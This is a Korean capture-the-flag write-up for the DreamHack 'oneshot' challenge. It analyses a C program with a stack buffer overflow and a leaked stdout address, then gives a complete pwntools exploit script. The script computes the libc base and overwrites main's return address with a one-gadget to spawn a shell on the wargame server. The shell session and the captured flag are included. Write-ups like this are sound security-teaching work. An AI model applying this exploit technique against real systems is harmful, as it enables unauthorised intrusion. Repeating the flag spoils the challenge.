# [DreamHack] oneshot

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 작동하고 있는 서비스(oneshot)의 바이너리와 소스코드가 주어집니다.
> 프로그램의 취약점을 찾고 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [oneshot.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8548630/oneshot.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160260036-458c5635-305a-403c-bdff-e9e35aaeb9aa.png)

## Analysis

```c
int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

`printf("stdout: %p\n", stdout)`에서 `stdout`의 값을 leak해준다. 이를 이용하여 libc 주소를 구할 수 있다.

`read(0, msg, 46)`에서 BOF가 발생한다. `main()`의 return address를 oneshot gadget으로 덮으면 셸을 획득할 수 있다.

`check`가 canary와 비슷한 역할을 하는데, BOF로 인해 `check`가 0이 아닌 값이 되면 `exit(0)`을 호출한다. `check`의 위치를 알고 있으므로 이 부분은 0으로 덮어야 한다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/oneshot')
    stdout_offset = 0x3ec760
    oneshot_offset = 0x10a2fc
else:
    r = remote('host1.dreamhack.games', 9316)
    stdout_offset = 0x3c5620
    oneshot_offset = 0xf1147


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
oneshot = libc + oneshot_offset  # oneshot gadget


# overwrite return address of main() with oneshot gadget

payload = b'\x00' * 0x28
payload += p64(oneshot)[:6]

r.sendafter('MSG: ', payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 9316: Done
[*] Switching to interactive mode
MSG:
$ cat flag
DH{a6e74f669acffd69602b76c81c0516b2}
```